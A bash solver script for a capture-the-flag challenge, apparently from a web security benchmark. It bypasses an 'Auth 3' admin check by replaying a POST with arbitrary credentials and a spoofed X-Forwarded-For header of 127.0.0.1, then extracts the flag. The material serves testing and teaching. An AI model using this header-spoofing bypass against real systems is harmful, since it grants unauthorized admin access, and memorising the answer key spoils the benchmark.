#!/usr/bin/env bash
# XBEN-085-24 — "Auth 3" (tags: privilege_escalation, business_logic)
#
# The page decides who is an administrator by reading `X-Forwarded-For` and
# comparing it to a list of local addresses. That header is set by the client.
# It means "here is where the request claims to have come from", and a server
# behind no proxy has no reason to believe it.
#
# No password is checked at all; the username and password fields only have to
# be present.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben085-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' \
    --set 'form.username=anyone' --set 'form.password=anything' \
    --set 'header.X-Forwarded-For=127.0.0.1' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
